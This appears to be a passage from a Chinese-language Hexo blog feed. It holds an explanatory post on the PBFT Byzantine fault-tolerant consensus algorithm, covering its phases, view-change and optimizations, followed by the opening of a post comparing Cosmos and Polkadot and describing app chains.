    <content><![CDATA[<h1 id="PBFT共识算法"><a href="#PBFT共识算法" class="headerlink" title="PBFT共识算法"></a>PBFT共识算法</h1><h2 id="PBFT算法概述"><a href="#PBFT算法概述" class="headerlink" title="PBFT算法概述"></a>PBFT算法概述</h2><h3 id="定义与介绍"><a href="#定义与介绍" class="headerlink" title="定义与介绍"></a>定义与介绍</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>Practical Byzantine Fault Tolerance（PBFT）是一种用于分布式计算和分布式系统中的共识算法，旨在解决拜占庭容错问题。（拜占庭容错问题涉及到在分布式系统中存在故障或恶意节点的情况下，如何确保系统能够维持一致性）。</p>
<h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>PBFT是一种<strong>状态机副本复制算法</strong>，即服务作为状态机进行建模，状态机在分布式系统的不同节点进行副本复制。每个状态机的副本都保存了服务的状态，同时也实现了服务的操作。将所有的副本组成的集合使用大写字母R表示，使用0到|R|-1的整数表示每一个副本。为了描述方便，假设|R|&#x3D;3f+1，这里f是有可能失效的副本的最大个数。尽管可以存在多于3f+1个副本，但是额外的副本除了降低性能之外不能提高可靠性。</p>
<p><code>PBFT</code>算法中节点只有两种角色，<code>主节点（primary）</code>和<code>副本（replica）</code>，两种角色之间可以相互转换。两者之间的转换又引入了<code>视图（view）</code>的概念，<code>视图</code>在<code>PBFT</code>算法中起到逻辑时钟的作用。</p>
<p>  </p>
<h3 id="特点与工作原理"><a href="#特点与工作原理" class="headerlink" title="特点与工作原理"></a>特点与工作原理</h3><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ol>
<li><strong>拜占庭容错：</strong> PBFT旨在解决拜占庭容错问题，这意味着系统可以继续正常运行，即使有一些节点是恶意的或出现了故障。</li>
<li><strong>节点投票：</strong> 在PBFT中，网络中的节点会相互交流以达成共识。每个节点会对提出的交易或区块进行投票，表达自己的意见。</li>
<li><strong>三阶段协议：</strong> PBFT采用了一种三阶段的协议，包括预备（pre-prepare）、准备（prepare）和提交（commit）阶段。在每个阶段，节点都会按照协议的规则发送消息，以便其他节点验证并最终达成共识。</li>
<li><strong>多数原则：</strong> PBFT要求绝大多数节点达成一致意见，才能够执行交易或添加区块。这有助于防止恶意节点或错误导致的不一致性。</li>
<li><strong>较高性能：</strong> PBFT通常具有较高的性能，因为节点之间的通信和共识是快速的，不需要执行复杂的计算难题（如PoW）。</li>
<li><strong>可扩展性：</strong> 尽管PBFT对于确保一致性非常有效，但它的可扩展性在大型网络中可能受到限制。</li>
</ol>
<h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p> 其核心工作原理是在存在拜占庭错误的情况下，通过多个节点协作完成共识，保证系统的一致性和可靠性。</p>
<p><strong>具体：</strong></p>
<h5 id="1-请求阶段（Request）"><a href="#1-请求阶段（Request）" class="headerlink" title="1. 请求阶段（Request）"></a><strong>1. 请求阶段（Request）</strong></h5><ul>
<li>客户端（Client）向主节点发送请求，内容包括操作类型和参数。</li>
<li>请求格式为：<code>&lt;请求ID, 操作, 客户端ID&gt;</code>，通过消息认证机制确保其来源可信。</li>
</ul>
<hr>
<h5 id="2-预准备阶段（Pre-Prepare）"><a href="#2-预准备阶段（Pre-Prepare）" class="headerlink" title="2. 预准备阶段（Pre-Prepare）"></a><strong>2. 预准备阶段（Pre-Prepare）</strong></h5><ul>
<li>主节点接收到客户端请求后，为该请求分配序列号（Sequence Number）。</li>
<li>主节点将请求与序列号组成的消息广播给所有备节点，格式为：<br><code>&lt;视图号, 序列号, 请求内容&gt;</code>。</li>
<li>备节点验证：<ol>
<li>消息的完整性和合法性。</li>
<li>主节点是否按照请求的顺序分配序列号。</li>
</ol>
</li>
<li>若验证通过，备节点记录该消息并进入下一阶段。</li>
</ul>
<hr>
<h5 id="3-准备阶段（Prepare）"><a href="#3-准备阶段（Prepare）" class="headerlink" title="3. 准备阶段（Prepare）"></a><strong>3. 准备阶段（Prepare）</strong></h5><ul>
<li>每个备节点将自己接收到的 <code>Pre-Prepare</code> 消息广播给其他节点，形成 <code>Prepare</code> 消息。</li>
<li>节点收到至少 2f+1条来自不同节点的 <code>Prepare</code> 消息（包括自身）后，确认该请求在网络中达成了一致性，记录状态并进入下一阶段。</li>
</ul>
<hr>
<h5 id="4-提交阶段（Commit）"><a href="#4-提交阶段（Commit）" class="headerlink" title="4. 提交阶段（Commit）"></a><strong>4. 提交阶段（Commit）</strong></h5><ul>
<li>每个节点将 <code>Prepare</code> 消息汇总并广播一个 <code>Commit</code> 消息。</li>
<li>当一个节点收到至少 2f+1条 <code>Commit</code>消息后：<ol>
<li>确认请求已被网络中大多数节点接受。</li>
<li>执行操作，并记录操作结果。</li>
</ol>
</li>
</ul>
<hr>
<h5 id="5-回复阶段（Reply）"><a href="#5-回复阶段（Reply）" class="headerlink" title="5. 回复阶段（Reply）"></a><strong>5. 回复阶段（Reply）</strong></h5><ul>
<li>节点将执行结果发送给客户端。</li>
<li>客户端接收到来自至少 f+1 个不同节点的相同回复后，确认操作成功完成。</li>
</ul>
<hr>
<h2 id="PBFT算法流程"><a href="#PBFT算法流程" class="headerlink" title="PBFT算法流程"></a>PBFT算法流程</h2><p>  在算法开始阶段，<code>主节点</code>由 <code>p = v mod n</code>计算得出，随着<code>v</code>的增长可以看到<code>p</code>不断变化。</p>
<p>  首先客户端发送消息<code>m</code>给主节点<code>p</code>，主节点就开始了<code>PBFT</code>三阶段协议，其中<code>pre-prepare</code>和<code>prepare</code>阶段最重要的任务是保证同一个<code>主节点</code>发出的请求在同一个<code>视图（view）</code>中的顺序是一致的，<code>prepare</code>和<code>commit</code>阶段最重要的任务是保证请求在不同<code>视图</code>之间的顺序是一致的。</p>
<ul>
<li>主节点收到客户端发送来的消息后，构造<code>pre-prepare</code>消息结构体<code>&lt; &lt;PRE-PREPARE, v, n, d&gt;, m &gt;</code>广播到集群中的其它节点。<ol>
<li><code>PRE-PREPARE</code>标识当前消息所处的协议阶段。</li>
<li><code>v</code>标识当前视图编号。</li>
<li><code>n</code>为主节点广播消息的一个唯一递增序号。</li>
<li><code>d</code>为<code>m</code>的消息摘要。</li>
<li><code>m</code>为客户端发来的消息。</li>
</ol>
</li>
<li><code>副本(backup)</code>收到主节点请求后，会对消息进行检查，检查通过会存储在本节点。当节点收到<code>2f+1</code>（包括自己）个相同的消息后，会进入<code>PREPARE</code>状态，广播消息<code>&lt; &lt;PREPARA, v, n, d, i&gt; &gt;</code>，其中<code>i</code>是本节点的编号。对消息的有效性有如下检查：<ol>
<li>检查收到的消息体中摘要<code>d</code>，是否和自己对<code>m</code>生成的摘要一致，确保消息的完整性。</li>
<li>检查<code>v</code>是否和当前视图<code>v</code>一致。</li>
<li>检查序号<code>n</code>是否在水线<code>h</code>和<code>H</code>之间，避免快速消耗可用序号。</li>
<li>检查之前是否接收过相同序号<code>n</code>和<code>v</code>，但是不同摘要<code>d</code>的消息。</li>
</ol>
</li>
<li><code>副本</code>收到<code>2f+1</code>（包括自己）个一致的<code>PREPARE</code>消息后，会进入<code>COMMIT</code>阶段，并且广播消息<code>&lt; COMMIT, v, n, D(m), i &gt;</code>给集群中的其它节点。在收到<code>PREPARE</code>消息后，副本同样也会对消息进行有效性检查，检查的内容是上文<code>1, 2, 3</code>。</li>
<li><code>副本</code>收到<code>2f+1</code>（包括自己）个一致的<code>COMMIT</code>个消息后执行<code>m</code>中包含的操作，其中，如果有多个<code>m</code>则按照序号<code>n</code>从小到大执行，执行完毕后发送执行成功的消息给客户端。</li>
</ul>
<p>算法的流程图：</p>
<p><img src="https://s2.loli.net/2024/12/16/Uu7bC3d2PieGyQq.webp" alt="1.webp"></p>
<p><strong>Pbft算法的时间复杂度？</strong><br>A：Pbft算法的时间复杂度O(n^2)，在<code>prepare</code>和<code>commit</code>阶段会将消息广播两次，一般而言，Pbft集群中的节点都不会超过100。</p>
<h2 id="PBFT-算法的优势与挑战"><a href="#PBFT-算法的优势与挑战" class="headerlink" title="PBFT 算法的优势与挑战"></a>PBFT 算法的优势与挑战</h2><h3 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h3><h4 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h4><p>PBFT是一种可行的共识算法，特别适用于需要高度安全性和快速共识的场景，例如金融领域或联盟区块链。</p>
<h4 id="较高容错性"><a href="#较高容错性" class="headerlink" title="较高容错性"></a>较高容错性</h4><p>为了更多的容错性，<code>PBFT</code>算法最大的容错节点数量<code>( n - 1 ) / 3</code>，也就是是说4个节点的集群最多只能容忍一个节点作恶或者故障。</p>
<h4 id="保证集群的可用性-稳定性"><a href="#保证集群的可用性-稳定性" class="headerlink" title="保证集群的可用性&amp;稳定性"></a>保证集群的可用性&amp;稳定性</h4><ul>
<li>具有<strong>视图切换</strong>（View-Change）机制。</li>
</ul>
<p><code>view-change</code>提供了一种当主节点宕机以后依然可以保证集群可用性的机制。<code>view-change</code>通过计时器来进行切换，避免副本长时间的等待请求。<br>当副本收到请求时，就启动一个计时器，如果这个时候刚好有定时器在运行就重置（reset）定时器，但是<code>主节点</code>宕机的时候，副本<code>i</code>就会在当前<code>视图</code>v中超时，这个时候副本<code>i</code>就会触发<code>view-change</code>的操作，将视图切换为<code>v+1</code>。</p>
<ul>
<li><p>副本<code>i</code>会停止接收除了<code>checkpoint</code>,<code>view-change</code>和<code>new view-change</code>以外的请求，同时广播消息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;VIEW-CHANGE, v+1, n, C, P, i&gt;</span><br></pre></td></tr></table></figure>

<p>的消息到集群。</p>
<ol>
<li><code>n</code>是节点<code>i</code>知道的最后一个<code>stable checkpoint</code>的消息序号。</li>
<li><code>C</code>是节点<code>i</code>保存的经过<code>2f+1</code>个节点确认<code>stable checkpoint</code>消息的集合。</li>
<li><code>P</code>是一个保存了<code>n</code>之后所有已经达到<code>prepared</code>状态消息的集合。</li>
</ol>
</li>
<li><p>当在视图( v+1 )中的主节点<code>p1</code>接收到<code>2f</code>个有效的将视图变更为<code>v+1</code>的消息以后，<code>p1</code>就会广播一条消息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;NEW-VIEW, v+1, V, Q&gt;</span><br></pre></td></tr></table></figure>

<ol>
<li><code>V</code>是<code>p1</code>收到的，包括自己发送的<code>view-change</code>的消息集合。</li>
<li><code>Q</code>是<code>PRE-PREPARE</code>状态的消息集合，但是这个<code>PRE-PREPARE</code>消息是从<code>PREPARE</code>状态的消息转换过来的。</li>
</ol>
</li>
<li><p>从节点接收到<code>NEW-VIEW</code>消息后，校验签名，<code>V</code>和<code>Q</code>中的消息是否合法，验证通过，主节点和副本都 进入视图<code>v+1</code>。</p>
</li>
</ul>
<p>  当<code>p1</code>在接收到<code>2f+1</code>个<code>VIEW-CHANGE</code>消息以后，可以确定<code>stable checkpoint</code>之前的消息在视图切换的过程中不会丢，但是当前检查点之后，下一个检查点之前的已经<code>PREPARE</code>可能会被丢弃，在视图切换到<code>v+1</code>后，<code>Pbft</code>会把旧视图中已经<code>PREPARE</code>的消息变为<code>PRE-PREPARE</code>然后新广播。</p>
<ul>
<li>如果集合<code>P</code>为空，广播<code>&lt;PRE-PREPARE, v+1, n, null&gt;</code>，接收节点就什么也不做。</li>
<li>如果集合<code>P</code>不为空，广播<code>&lt;PRE-PREPARE, v+1, n,d&gt;</code></li>
</ul>
<p>  总结一下，在<code>view-change</code>中最为重要的就是<code>C</code>，<code>P</code>，<code>Q</code>三个消息的集合，<code>C</code>确保了视图变更的时候，<code>stable checkpoint</code>之前的状态安全。<code>P</code>确保了视图变更前，已经<code>PREPARE</code>的消息的安全。<code>Q</code>确保了视图变更后<code>P</code>集合中的消息安全。回想一下<code>pre-prepare</code>和<code>prepare</code>阶段最重要的任务是保证，同一个<code>主节点</code>发出的请求在同一个<code>视图（view）</code>中的顺序是一致的，而在视图切换过程中的<code>C</code>，<code>P</code>，<code>Q</code>三个集合就是解决这个问题的。</p>
<ul>
<li><strong>视图协商（NegotiateView）机制</strong></li>
</ul>
<p>集群在运行过程中，可能出现网络抖动、磁盘故障等原因，会导致部分节点的执行速度落后大多数节点，在<code>Pbft</code>中采用了<code>视图协商（NegotiateView）</code>的机制来保持同步。</p>
<p>当一个节点多次<code>view-change</code>失败就触发<code>NegotiateView</code>同步集群数据，流程如下：</p>
<p><img src="https://s2.loli.net/2024/12/16/WIfvRk62ZLqwQsr.webp" alt="2.webp"></p>
<ul>
<li>新增节点<code>Replica 4</code>发起<code>NegotiateView</code>消息给其他节点；</li>
<li>其余节点收到消息以后，返回自己的视图信息，节点ID，节点总数N；</li>
<li><code>Replica 4</code>收到<code>2f+1</code>个相同的消息后，如果quorum个视图编号和自己不同，则同步view和N；</li>
<li><code>Replica 4</code>同步完视图后，发送<code>RevoeryToCheckpoint</code>的消息，其中包含自身的<code>checkpoint</code>信息；</li>
<li>其余节点收到<code>RevoeryToCheckpoint</code>后将自身最新的检查点信息返回给<code>Replica 4</code>;</li>
<li><code>Replica 4</code>收到quorum个消息后，更新自己的检查点到最新，更新完成以后向正常节点索要pset、qset和cset的信息（即PBFT算法中pre-prepare阶段、prepare阶段和commit阶段的数据）同步至全网最新状态；</li>
</ul>
<h4 id="遵循线性一致性（-linearizability-）"><a href="#遵循线性一致性（-linearizability-）" class="headerlink" title="遵循线性一致性（ linearizability ）"></a>遵循线性一致性（ linearizability ）</h4><p>（线性一致性的解释：就是在并发编程里，我们进行了一番操作，得到了一个结果。然后这个操作的运行记录，和按照串行顺序一步步来的运行记录相一致，我们就能称其为「线性一致的（linearizable）」）。</p>
<h3 id="挑战"><a href="#挑战" class="headerlink" title="挑战"></a>挑战</h3><p>PBFT的实现可能相对复杂，且在大规模网络中可能面临一些挑战。</p>
<p><code>PBFT</code>算法假设的环境比<code>Raft</code>算法更加的’恶劣‘，<code>Raft</code>算法只支持容错故障节点，而<code>PBFT</code>算法除了需要支持容错故障节点之外，还需要容忍作恶节点（作恶节点节点是指可能对接收到的消息作出截然相反的回复，甚至伪造消息）。</p>
<h2 id="PBFT算法的实现与优化"><a href="#PBFT算法的实现与优化" class="headerlink" title="PBFT算法的实现与优化"></a>PBFT算法的实现与优化</h2><p>与传统的Proof of Work（PoW）和Proof of Stake（PoS）等共识算法不同，PBFT通常用于<strong>私有或联盟区块链网络</strong>，其中节点的身份已知，且相互信任。其和 <a href="https://learnblockchain.cn/2019/07/18/raft-protocol/">Raft算法</a>解决的核心问题都是在分布式环境下如何保持集群状态的一致性，简而言之就是一组服务，给定一组操作，最后得到一致的结果。</p>
<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p><strong>代码实现：</strong></p>
<p><a href="https://github.com/CyHsiung/Practical-Byzantine-Fault-Tolerance-PBFT-">https://github.com/CyHsiung/Practical-Byzantine-Fault-Tolerance-PBFT-</a></p>
<ol>
<li><strong>联盟链</strong></li>
</ol>
<p>PBFT 是联盟链的常用共识算法，因为它对节点的数量和参与身份有一定限制，适合权限网络。</p>
<ul>
<li><code>Hyperledger Fabric</code>：PBFT 早期被作为 Hyperledger 的共识候选。</li>
<li><code>Tendermint</code>：基于 PBFT 的一种区块链共识实现，注重高性能和低延迟。</li>
</ul>
<ol start="2">
<li><strong>分布式数据库</strong></li>
</ol>
<ul>
<li>在需要高容错性的分布式数据库中，PBFT 可用于确保数据一致性和可用性。</li>
</ul>
<ol start="3">
<li><strong>金融系统</strong></li>
</ol>
<ul>
<li>金融机构常部署 PBFT 来防范节点作恶，从而在跨机构交易或清算网络中提供高安全性。</li>
</ul>
<ol start="4">
<li><strong>物联网（IoT）</strong></li>
</ol>
<ul>
<li>在边缘计算场景，PBFT 被用于提高节点协作的一致性，增强系统的鲁棒性。</li>
</ul>
<h4 id="优化："><a href="#优化：" class="headerlink" title="优化："></a><strong>优化：</strong></h4><p>原始 PBFT 的消息复杂度为 O(n2))，针对该问题，以下优化措施被提出：</p>
<ol>
<li><p><strong>分批处理</strong></p>
<p>将节点分为共识节点和候选节点。通过优化一致性协议，以减少共识过程中节点的通信量</p>
</li>
<li><p><strong>使用消息认证码（MAC）</strong></p>
<p>在正常运行时，使用 MAC 替代公钥加密进行节点身份验证，显著提高效率。</p>
</li>
<li><p><strong>快速路径优化</strong></p>
<p>在无故障情况下，跳过某些冗余通信步骤，进一步加快请求处理速度。</p>
</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>PBFT 算法作为分布式共识的基础，推动了区块链和容错技术的发展。随着优化技术的进一步提升，它在金融、物联网和云计算等领域的应用潜力将更加广阔。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>线性一致性解释参考论文：<a href="https://cs.brown.edu/~mph/HerlihyW90/p463-herlihy.pdf">https://cs.brown.edu/~mph/HerlihyW90/p463-herlihy.pdf</a></p>
<p>全篇参考论文：<a href="http://www.scs.stanford.edu/nyu/03sp/sched/bfs.pdf">www.scs.stanford.edu/nyu/03sp/sched/bfs.pdf</a></p>
<p>优化参考：优化PBFT算法实现<a href="https://github.com/fangvv/SPBFT">https://github.com/fangvv/SPBFT</a></p>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>Layer0-2</title>
    <url>/2025/03/22/Layer0-2/</url>
    <content><![CDATA[<h2 id="项目举例"><a href="#项目举例" class="headerlink" title="项目举例"></a>项目举例</h2><h3 id="Cosmos"><a href="#Cosmos" class="headerlink" title="Cosmos"></a>Cosmos</h3><p><strong>设计目的</strong></p>
<ul>
<li>Cosmos 的设计目标是成为可以建立各类区块链通信、共享的底层架构。</li>
<li>Cosmos SDK 是一套具有开箱即用的共识和执行工具，允许任何人创建自己的 PoA&#x2F;PoS 区块链。</li>
</ul>
<ul>
<li><p>Cosmos <strong>不是</strong> ETH 这个 L1 的 L0。</p>
</li>
<li><p>Cosmos 上可以建立自己的 L1，主要分为：</p>
<ul>
<li><strong>平台类的链</strong>（如 Terra）</li>
<li><strong>应用链</strong>（App Chain）</li>
</ul>
</li>
<li><p>各类链通过 <strong>IBC（Inter-Blockchain Communication Protocol）</strong> 连接 Cosmos Hub。</p>
</li>
<li><p>Cosmos 的设计前提：</p>
<ul>
<li>基于智能合约的虚拟机在灵活性、主权和性能上受限。</li>
<li>Cosmos 不是建立一个可运行多应用的单一虚拟机，而是鼓励和促进为每个用例创建单独的区块链。</li>
<li>应用程序开发者可以灵活选择架构、语言等，最后通过 Cosmos 的多链通信层 IBC 实现互操作性。</li>
</ul>
</li>
</ul>
<h3 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h3><ul>
<li>单个区块链被称为：<strong>区（zone）</strong></li>
<li>连接模块被称为：<strong>中心（hub）</strong></li>
</ul>
<p><strong>关于Cosmos</strong></p>
<ul>
<li>Cosmos打造了全套的标准化开发工具，降低开者发门槛，实现公链开发的标准化以及公链网络互通，包括Tendermint共识引擎，Cosmos SDK 的模块化开发框架，IBC通信协议，同时自己建立了一条枢纽链，称为Cosmos Hub，连接所有Cosmos生态公链</li>
<li>Tendermint共识引擎:提供了通用的网络层和共识层，基于POS机制，开发者可以直接采用，专心设计应用层</li>
<li>Cosmos SDK:包含各种应用层常用模块，开发者可以直接调用IBC通信协议:Cosmos生态链间的网络传输协议</li>
<li>枢纽Cosmos Hub:更新所有Zone的区块头作为验证的信息，记录所有链的数据和交易记录，作为不同的Zone间的通信枢纽分区Zone:连接到枢纽的各条公链也被称为分区(Zone)</li>
</ul>
<p><strong>关于波卡</strong></p>
<ul>
<li>波卡打造了基于Substrate创的主链称为中继链，中继链配有被称作“插槽”的接口，让其他公链通过插槽接入中继链，通过插槽与中继链链接的公链称为平行链(parachains)</li>
<li>中继链:验证各个平行链给出来的区块，并给出最终确定性的证明，接入中继链的公链可以以任何自治方式产生区块</li>
<li>平行链:主要负责数据的运算和交易信息的处理，通过多条平行链，就可以完成区块链的横向扩展，解决区块链的性能问题</li>
<li>Substrate:波卡设计的开发模板</li>
</ul>
<hr>
<h1 id="Cosmos与波卡（Polkadot）区别"><a href="#Cosmos与波卡（Polkadot）区别" class="headerlink" title="Cosmos与波卡（Polkadot）区别"></a>Cosmos与波卡（Polkadot）区别</h1><h3 id="1-安全性"><a href="#1-安全性" class="headerlink" title="1.安全性"></a>1.安全性</h3><h4 id="🌐Polkadot-共享全局安全"><a href="#🌐Polkadot-共享全局安全" class="headerlink" title="🌐Polkadot - 共享全局安全"></a>🌐<strong>Polkadot - 共享全局安全</strong></h4><ul>
<li><strong>平行链（Parachain）</strong>：独立的状态机，拥有自定义规则、共识算法和手续费结构。</li>
<li><strong>中继链（Relay Chain）</strong>：母链，负责维护所有平行链的“全局状态”。</li>
<li><strong>GRANDPA 共识机制</strong>：快速确认平行链区块，保障网络安全性。</li>
<li><strong>共享安全性</strong>：中继链的验证者数量越多（如1000名验证者），平行链的安全性越高。</li>
<li><strong>缺点</strong>：<ul>
<li>平行链状态需由中继链验证者确认，存在被恶意拒绝的风险。</li>
<li>为降低风险，Polkadot 会对验证者进行混洗，随机分配验证任务。</li>
</ul>
</li>
<li><strong>Fishermen（渔夫）机制</strong>：专门监控验证者行为，防止作恶。</li>
</ul>
<hr>
<h4 id="🌐-Cosmos-独立的局部安全"><a href="#🌐-Cosmos-独立的局部安全" class="headerlink" title="🌐 Cosmos - 独立的局部安全"></a>🌐 <strong>Cosmos - 独立的局部安全</strong></h4><ul>
<li><strong>每条链完全独立</strong>，有自己专属的共识机制和验证者集合。</li>
<li><strong>安全性独立</strong>：每条链需自己保障安全，验证者只保护本链。</li>
<li><strong>中心枢纽-分区模型（Hub &amp; Zone）</strong>：通过中心枢纽（Hub）实现不同区块链（Zone）之间的通信。</li>
<li><strong>IBC 协议（跨链通信）</strong>：实现链与链之间的消息和代币转移，初期支持代币传输，后续支持更多消息类型。</li>
<li><strong>优缺点对比</strong>：<ul>
<li><strong>优点</strong>：应用链控制力强，适合大公司（如币安、Telegram）自己主导和管理。</li>
<li><strong>缺点</strong>：小型应用难以搭建强大的验证者集，安全性难以保障。</li>
</ul>
</li>
</ul>
<hr>
<p>✅ <strong>总结核心区别</strong>：</p>
<ul>
<li><strong>Polkadot</strong>：统一共享安全，弱化单链控制力，适合需要安全保障和互操作性的应用。</li>
<li><strong>Cosmos</strong>：每链独立，安全性自负，适合想要完全掌控自己链的企业或项目。</li>
</ul>
<h3 id="2-治理和参与"><a href="#2-治理和参与" class="headerlink" title="2.治理和参与"></a>2.治理和参与</h3><h3 id="📌-参与规则差异"><a href="#📌-参与规则差异" class="headerlink" title="📌 参与规则差异"></a>📌 <strong>参与规则差异</strong></h3><h4 id="✅-Polkadot"><a href="#✅-Polkadot" class="headerlink" title="✅ Polkadot"></a>✅ <strong>Polkadot</strong></h4><ul>
<li>结构固定：中继链 + 最多约 100 条平行链（数量未来可能调整）。</li>
<li><strong>平行链使用权通过竞拍获得</strong>：<ul>
<li>采用拍卖机制，最高出价者中标。</li>
<li>中标者需锁定大量 <strong>DOT</strong>（原生代币）。</li>
<li>竞拍成功后，可在一定期限内使用平行链。</li>
<li><strong>退出规则</strong>：只有不再使用平行链时，才能解锁 DOT。</li>
</ul>
</li>
</ul>
<h4 id="✅-Cosmos"><a href="#✅-Cosmos" class="headerlink" title="✅ Cosmos"></a>✅ <strong>Cosmos</strong></h4><ul>
<li>结构灵活开放：任何人都可创建中心枢纽（Hub）或分区（Zone）。</li>
<li>不设上限或统一竞拍机制，开放参与。</li>
<li>示例：<ul>
<li><strong>Cosmos Hub</strong>（由 Tendermint 团队开发）</li>
<li><strong>Iris Hub</strong>（面向中国及亚洲市场）</li>
</ul>
</li>
<li>中心枢纽-分区模型简化跨链通信，避免链链直连。</li>
</ul>
<hr>
<h3 id="📌-治理流程差异"><a href="#📌-治理流程差异" class="headerlink" title="📌 治理流程差异"></a>📌 <strong>治理流程差异</strong></h3><h4 id="✅-Polkadot-1"><a href="#✅-Polkadot-1" class="headerlink" title="✅ Polkadot"></a>✅ <strong>Polkadot</strong></h4><ul>
<li><strong>治理依赖 DOT 质押量</strong>：<ul>
<li>投票权重按持有和质押的 DOT 数量决定。</li>
</ul>
</li>
<li><strong>设立治理委员会</strong>：<ul>
<li>代表不活跃的 DOT 持有者投票。</li>
<li>委员会从 6 人开始，每两周增加 1 人，最多 24 人。</li>
</ul>
</li>
<li><strong>治理功能强大</strong>，可调整：<ul>
<li>中继链参数（如出块时间、区块奖励等）</li>
<li>平行链竞拍规则及所需 DOT 数量</li>
</ul>
</li>
<li><strong>DOT 持有者无权强制下架某条平行链</strong>：<ul>
<li>只能改变后续的参与流程。</li>
<li>平行链租期内享有完整使用权，受保护。</li>
</ul>
</li>
</ul>
<h4 id="✅-Cosmos-1"><a href="#✅-Cosmos-1" class="headerlink" title="✅ Cosmos"></a>✅ <strong>Cosmos</strong></h4><ul>
<li><strong>无统一治理</strong>，各 Hub 和 Zone 自治。</li>
<li><strong>Cosmos Hub 的治理流程</strong>（代表性示例）：<ul>
<li>任何人可提交提案。</li>
<li>ATOM 质押者按质押量投票，决定提案是否通过。</li>
</ul>
</li>
<li>治理规则完全由各自链决定，灵活度高。</li>
<li>示例文档：Chorus One 的《Cosmos Hub 治理机制》详细介绍了流程。</li>
</ul>
<h3 id="3-跨链通信对比"><a href="#3-跨链通信对比" class="headerlink" title="3. 跨链通信对比"></a>3. 跨链通信对比</h3><h3 id="📌-设计目标与通信方式"><a href="#📌-设计目标与通信方式" class="headerlink" title="📌 设计目标与通信方式"></a>📌 <strong>设计目标与通信方式</strong></h3><h4 id="✅-Polkadot-2"><a href="#✅-Polkadot-2" class="headerlink" title="✅ Polkadot"></a>✅ <strong>Polkadot</strong></h4><ul>
<li>目标：实现 <strong>任意消息传递</strong>（不仅限于资产转移）<ul>
<li>平行链 A 可直接调用平行链 B 的智能合约，转账或传递任意数据</li>
</ul>
</li>
<li>通信协议：<strong>ICMP</strong>（Inter-Chain Message Passing）</li>
<li>所有平行链共享同一中继链的安全性</li>
</ul>
<h4 id="✅-Cosmos-2"><a href="#✅-Cosmos-2" class="headerlink" title="✅ Cosmos"></a>✅ <strong>Cosmos</strong></h4><ul>
<li>目标：聚焦 <strong>资产转移</strong><ul>
<li>优先实现代币跨链转账</li>
</ul>
</li>
<li>通信协议：<strong>IBC</strong>（Inter-Blockchain Communication）</li>
<li>每条链独立，通信时需信任目标链的验证者集</li>
</ul>
<hr>
<h3 id="📌-安全性设计与挑战"><a href="#📌-安全性设计与挑战" class="headerlink" title="📌 安全性设计与挑战"></a>📌 <strong>安全性设计与挑战</strong></h3><h4 id="✅-Polkadot-3"><a href="#✅-Polkadot-3" class="headerlink" title="✅ Polkadot"></a>✅ <strong>Polkadot</strong></h4><ul>
<li><strong>共享安全性</strong>：<ul>
<li>所有平行链安全等级一致，可互相信任</li>
</ul>
</li>
<li>解决分叉与重组问题：<ul>
<li>如果平行链出现无效区块，<strong>Fisherman（渔夫）机制</strong> 可举报并回滚全网状态</li>
</ul>
</li>
<li><strong>数据可用性挑战</strong>：<ul>
<li>验证者随机分配至不同平行链，需频繁下载新链状态，带来巨大技术难题</li>
</ul>
</li>
<li>如果中继链出现错误，全网所有平行链都会受影响（牵一发动全身）</li>
</ul>
<h4 id="✅-Cosmos-3"><a href="#✅-Cosmos-3" class="headerlink" title="✅ Cosmos"></a>✅ <strong>Cosmos</strong></h4><ul>
<li><strong>各链独立安全</strong>：<ul>
<li>每条分区链有自己的验证者集</li>
<li>通信时，必须信任对方分区的验证者</li>
</ul>
</li>
<li><strong>分叉和双花风险</strong>：<ul>
<li>如果目标分区（如 Ethermint）验证者恶意，可能双花代币</li>
<li>风险仅限于该分区及持有该分区代币的其他分区用户</li>
<li>Cosmos 架构设计为 <strong>“局部受损可控”</strong>，防止恶意行为蔓延至全网</li>
</ul>
</li>
</ul>
<p>还有共识算法，SDK等</p>
<hr>
<h1 id="什么是应用链（App-Chain）"><a href="#什么是应用链（App-Chain）" class="headerlink" title="什么是应用链（App Chain）"></a>什么是应用链（App Chain）</h1><h2 id="📌定义"><a href="#📌定义" class="headerlink" title="📌定义"></a>📌定义</h2><p><strong>应用链（Appchain）</strong>，全称 <strong>“应用专属链”</strong>，是为特定应用（DApp）量身打造的区块链，专门服务于某个应用或某一类应用场景。</p>
<p>与以太坊等通用公链不同，应用链并不追求通用性和兼容所有应用，而是聚焦在某个特定业务领域，优化性能、费用、交互体验、安全性等方面。</p>
<hr>
<h2 id="核心特点："><a href="#核心特点：" class="headerlink" title="核心特点："></a>核心特点：</h2><ol>
<li><strong>专为特定 DApp 或垂直行业设计</strong><ul>
<li>例如 GameFi、DeFi、NFT、社交、支付等场景；</li>
<li>性能、规则、经济模型完全围绕目标应用优化。</li>
</ul>
</li>
<li><strong>性能更优</strong><ul>
<li>高吞吐、低延迟、低 gas 费，满足 Web3 中的 Web2 级体验需求；</li>
<li>适合高频交易场景，如游戏、社交等。</li>
</ul>
</li>
<li><strong>更灵活的治理和经济模型</strong><ul>
<li>应用方（DApp 项目方）拥有更强的自主权；</li>
<li>设计自己的 token 经济模型、手续费规则。</li>
</ul>
</li>
<li><strong>安全模型可依托主链或自建</strong><ul>
<li>可以依附在 Cosmos、Polkadot 这样的跨链生态，享受共享安全；</li>
<li>也可以自建共识和安全机制。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="举例理解："><a href="#举例理解：" class="headerlink" title="举例理解："></a>举例理解：</h4><ul>
<li><strong>Yuga Labs 的 ApeChain（BAYC 背后的专属链）</strong><ul>
<li>BAYC 社区因 NFT 链上交易费用高，转而建设自己的应用链；</li>
